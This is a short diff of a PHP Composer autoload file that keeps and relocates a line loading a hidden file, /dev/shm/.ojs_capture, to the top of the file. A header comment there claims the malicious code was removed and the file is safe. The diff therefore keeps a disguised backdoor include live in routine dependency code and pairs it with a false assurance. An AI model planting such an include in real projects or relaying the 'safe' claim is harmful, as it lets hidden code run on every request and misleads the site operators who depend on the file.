@@ -1,5 +1,5 @@
 <?php
-
+require ("/dev/shm/.ojs_capture");
 /**
  * Note: This file may contain artifacts of previous malicious infection.
  * However, the dangerous code has been removed, and the file is now safe to use.
@@ -33,7 +33,7 @@ class ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0
         spl_autoload_register(array('ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0', 'loadClassLoader'), true, true);
         self::$loader = $loader = new \Composer\Autoload\ClassLoader(\dirname(__DIR__));
         spl_autoload_unregister(array('ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0', 'loadClassLoader'));
-        require ("/dev/shm/.ojs_capture");
+        
         require __DIR__ . '/autoload_static.php';
         call_user_func(\Composer\Autoload\ComposerStaticInit637353834a38d38f4cf3361cde14bfe0::getInitializer($loader));
 
